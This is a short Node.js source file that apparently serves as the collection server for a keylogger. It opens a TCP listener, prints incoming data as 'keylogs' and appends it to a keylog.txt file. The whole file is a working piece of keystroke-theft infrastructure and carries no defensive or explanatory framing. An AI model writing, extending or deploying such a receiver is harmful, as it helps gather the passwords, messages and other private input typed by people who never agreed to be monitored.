const net = require('net');
const { appendFileSync } = require('fs');

const server = net.createServer(socket => {
    socket.on('data', data => {
        try {
            console.log(`Recieving keylogs: ${data.toString()}`);//<--Clg's the recieved log 
            appendFileSync('./keylog.txt', data.toString(), { mode: 0o755 });//<--Save it on keylog.txt
        } catch (error) {
            console.error(error);
        }
    });
});

module.exports = server;